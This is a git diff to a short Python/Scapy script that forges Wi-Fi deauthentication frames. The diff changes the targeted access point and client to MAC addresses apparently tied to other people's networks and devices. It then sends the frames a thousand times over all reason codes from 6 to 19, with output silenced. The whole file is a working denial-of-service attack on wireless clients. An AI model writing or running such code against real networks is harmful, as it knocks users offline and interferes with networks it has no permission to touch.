@@ -1,6 +1,6 @@
 from scapy.all import *
 
-one_nord = "BE:DD:85:EF:68:FC"
+one_nord = "2E:E4:F0:11:48:B5"
 Error404 = "10:5A:F7:0F:5F:14"
 trala = "88:D7:F6:2A:5D:4D"
 shabab = "26:18:1D:7C:7A:EB"
@@ -11,8 +11,8 @@ self_PC = "A4:C3:F0:8D:2E:67"
 # packet = RadioTap()/dot11/Dot11Deauth(reason=7)
 
 packets = []
-ap_bssid = Error404
-client_mac = self_PC
+ap_bssid = shabab
+client_mac = one_nord
 
 # packet = RadioTap() / Dot11(addr1=self_PC, addr2=Error404, addr3=Error404) / Dot11Deauth()
 
@@ -26,6 +26,6 @@ for reason_code in range(6, 20):
     
 for i in range(1000):
     for packet in packets:
-        sendp(packet, count=1, inter=0.1, iface="wlan1")
+        sendp(packet, count=1, inter=0.1, iface="wlan1", verbose=0)
 
 # sendp(packet, inter=.1, count=10000, iface="wlan1")
